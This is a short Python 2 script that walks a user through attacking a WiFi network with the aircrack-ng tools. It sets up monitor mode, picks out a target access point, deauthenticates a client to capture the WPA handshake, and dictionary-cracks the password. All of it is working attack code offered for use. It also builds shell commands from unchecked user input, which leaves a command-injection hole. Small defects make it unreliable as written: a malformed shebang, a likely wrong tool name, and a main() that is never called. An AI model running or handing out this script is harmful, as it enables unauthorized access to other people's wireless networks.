#!usr/bin/python
import threading
import sys
import os

def usage():
    print ""

def setup_interface(interface):
    os.system("airmon-ng check kill")
    
    command = "airmon-ng start {}".format(interface)

    os.system(command)

    print "Your interface is now {}mon".format(interface)

def list_ap(interface):
    command = "airodump-ng {}".format(interface)

    print "If you see wifi that you want to attack precc Ctrl+C\n"

    os.system(command)

def list_clients(ap_bssid, channel, filename ,interface):
    command = "airodump-ng -c {} --bssid {} -w {} {}".format(channel, ap_bssid, filename, interface)

    os.system(command)

def deauth(ap_bssid, client_bssid, interface):
    command = "aireplay -0 1 -a {} -c {} {}".format(ap_bssid, client_bssid, interface)

    os.system(command)

def crack_password(cap_filename, dict_name, ap_bssid):
    command = "aircrack-ng -w {} -b {} {}".format(dict_name, ap_bssid, cap_filename)

    os.system(command)

def main():
    print "Enter network interface name (e.g. wlan0)"
    interface = raw_input(">")

    setup_interface(interface)

    interface += "mon"

    list_ap(interface)

    print "Enter network BSSID"
    ap_bssid = raw_input("> ")

    print "Enter network channel (CH)"
    channel = raw_input("> ")

    print "Enter .cap file name"
    cap_filename = raw_input("> ")

    threading.Thread(target=list_clients, args=(ap_bssid, channel, cap_filename, interface,)).start()

    print "Enter client STATION address (second column and row)"
    client_bssid = raw_input("> ")

    deauth(ap_bssid, client_bssid, interface)

    print "Enter dictionary name (with path)"
    dict_name = raw_input("> ")

    crack_password(cap_filename, dict_name, ap_bssid)